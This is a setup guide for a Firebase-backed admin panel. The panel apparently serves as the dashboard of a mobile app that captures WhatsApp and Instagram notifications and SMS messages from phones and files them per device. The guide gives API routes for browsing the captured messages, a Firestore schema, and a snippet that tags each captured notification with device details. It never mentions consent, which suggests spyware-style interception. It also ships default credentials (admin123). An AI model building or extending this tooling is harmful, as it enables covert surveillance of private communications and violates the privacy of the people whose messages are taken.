# Admin Panel Setup Guide

## 🚀 Quick Start

Follow these steps to get your admin panel running:

---

## Step 1: Get Firebase Service Account Key

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Select your project: **timaket-cbc41**
3. Click the ⚙️ gear icon → **Project Settings**
4. Go to **Service Accounts** tab
5. Click **"Generate New Private Key"**
6. Save the JSON file securely

---

## Step 2: Configure Environment Variables

Open `.env.local` and add your service account credentials:

```bash
# Copy from the downloaded JSON file:
FIREBASE_CLIENT_EMAIL=firebase-adminsdk-xxxxx@timaket-cbc41.iam.gserviceaccount.com
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYourPrivateKeyHere\n-----END PRIVATE KEY-----\n"
```

**Note:** The private key must be in quotes and include the `\n` newline characters.

**Already configured:**
- ✅ FIREBASE_PROJECT_ID=timaket-cbc41
- ✅ FIREBASE_STORAGE_BUCKET=timaket-cbc41.firebasestorage.app
- ✅ JWT_SECRET (change if you want)
- ✅ ADMIN_EMAIL
- ✅ ADMIN_PASSWORD_HASH

---

## Step 3: Install Dependencies

```bash
npm install
```

**Already installed:**
- firebase-admin
- bcryptjs
- jsonwebtoken (jose)

---

## Step 4: Create First Admin User

Run the setup script to create your first admin account:

```bash
npx tsx scripts/create-admin.ts
```

This will create an admin user with:
- **Email:** admin@itsyouapp.com
- **Password:** admin123

**⚠️ IMPORTANT:** Change the password after first login!

---

## Step 5: Start the Development Server

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000)

---

## Step 6: Login

1. Go to http://localhost:3000
2. Enter:
   - **Email:** admin@itsyouapp.com
   - **Password:** admin123
3. Click **Sign In**
4. You should be redirected to the dashboard!

---

## 📂 What Was Created

### Backend Files

```
admin-panel/
├── lib/
│   ├── firebase-admin.ts       # Firebase Admin SDK initialization
│   ├── auth.ts                 # Authentication utilities (JWT, bcrypt)
│   └── db.ts                   # Database query functions
│
├── app/api/
│   ├── auth/
│   │   ├── login/route.ts      # POST /api/auth/login
│   │   ├── logout/route.ts     # POST /api/auth/logout
│   │   └── verify/route.ts     # GET /api/auth/verify
│   ├── devices/
│   │   ├── route.ts            # GET /api/devices
│   │   └── [id]/route.ts       # GET /api/devices/:id
│   ├── messages/route.ts       # GET /api/messages
│   ├── sms/route.ts            # GET /api/sms
│   └── analytics/route.ts      # GET /api/analytics
│
└── scripts/
    └── create-admin.ts         # Setup script for first admin user
```

### Environment Files

```
.env.local                  # Your actual config (DO NOT commit to git)
.env.local.example          # Template for others
```

---

## 🔧 API Endpoints

All endpoints require authentication (except `/api/auth/login`)

### Authentication

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/login` | Login with email/password |
| POST | `/api/auth/logout` | Logout and clear session |
| GET | `/api/auth/verify` | Check if logged in |

### Devices

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/devices` | Get all devices |
| GET | `/api/devices/:id` | Get device details + messages |

### Messages

| Method | Endpoint | Query Params | Description |
|--------|----------|--------------|-------------|
| GET | `/api/messages` | `?app=whatsapp&type=sent&deviceId=xxx&limit=50` | Get messages with filters |

### SMS

| Method | Endpoint | Query Params | Description |
|--------|----------|--------------|-------------|
| GET | `/api/sms` | `?type=1&deviceId=xxx&limit=50` | Get SMS messages |

### Analytics

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/analytics` | Get overview statistics |

---

## 🔐 Security

### Authentication Flow

1. User enters email/password
2. Server verifies credentials against Firestore `admins` collection
3. Server creates JWT token (7 days expiry)
4. Token stored in httpOnly cookie
5. All API requests check for valid token
6. Unauthorized requests return 401

### Password Security

- Passwords hashed with bcrypt (12 rounds)
- JWT tokens signed with secret key
- Cookies are httpOnly and secure (in production)

---

## 📊 Database Collections

The admin panel reads from these Firestore collections:

```
firestore/
├── admins/                    # Admin users
│   └── [adminId]
│       ├── email
│       ├── passwordHash
│       ├── role
│       └── createdAt
│
├── notifications/             # Captured WhatsApp/Instagram messages
│   └── [notificationId]
│       ├── deviceId
│       ├── appName
│       ├── sender
│       ├── text
│       ├── messageType
│       └── timestamp
│
├── sms/                       # Captured SMS
│   └── [smsId]
│       ├── deviceId
│       ├── address
│       ├── body
│       ├── type
│       └── date
│
├── users/                     # App users
├── sharedPhotos/              # Uploaded photos
├── musicLibrary/              # Music tracks
└── appSettings/               # App configuration
    └── homeMessage
```

---

## 🐛 Troubleshooting

### "Unauthorized" error after login

**Solution:**
1. Check if JWT_SECRET is set in `.env.local`
2. Clear browser cookies
3. Try logging in again

### "Firebase initialization error"

**Solution:**
1. Make sure `FIREBASE_CLIENT_EMAIL` and `FIREBASE_PRIVATE_KEY` are in `.env.local`
2. Check that the private key is in quotes and has `\n` characters
3. Verify your service account has proper permissions in Firebase Console

### "Admin user already exists"

**Solution:**
- This is normal if you already created an admin
- Use the existing credentials to login
- To create a new admin, add them manually in Firestore

### No data showing in dashboard

**Solution:**
1. Make sure your mobile app is sending data to Firestore
2. Check that `deviceId` field exists in your notifications/SMS
3. Verify collection names match (`notifications`, `sms`, etc.)

---

## 📱 Mobile App Integration

To ensure the admin panel can categorize by device, your mobile app must include `deviceId` in all Firestore writes:

```typescript
// Example: When capturing a notification
await firestore().collection('notifications').add({
  deviceId: await getDeviceId(), // ← IMPORTANT
  deviceName: await getDeviceName(),
  deviceModel: await getDeviceModel(),
  deviceOS: Platform.OS,
  appName: 'WhatsApp',
  text: 'Message text',
  // ... other fields
});
```

---

## 🚀 Next Steps

1. ✅ Login to admin panel
2. ✅ Update your password in Settings
3. ✅ Test all pages (Devices, Messages, SMS, etc.)
4. ⏳ Add more API endpoints as needed (photos, music, users)
5. ⏳ Deploy to Vercel (when ready)

---

## 💡 Tips

- **Default credentials:** Email: `admin@itsyouapp.com`, Password: `admin123`
- **Change password:** Go to Settings page → Change Password (after implementing that feature)
- **Add more admins:** Run the create-admin script again with different email
- **Export service account key:** Keep it safe and NEVER commit to git

---

## ✅ Current Status

**Phase 1 - Backend Setup: COMPLETE** ✅

- [x] Firebase Admin SDK initialized
- [x] Authentication system (JWT + bcrypt)
- [x] Database query utilities
- [x] API routes for auth, devices, messages, SMS, analytics
- [x] Environment variables configured
- [x] Setup script for first admin user

**Next Phase: Connect Frontend**

- [ ] Update login page to call `/api/auth/login`
- [ ] Add authentication check to dashboard pages
- [ ] Connect devices page to `/api/devices`
- [ ] Connect messages page to `/api/messages`
- [ ] Add loading states and error handling

---

Need help? Check the implementation plan in `ADMIN_PANEL_IMPLEMENTATION_PLAN.md`
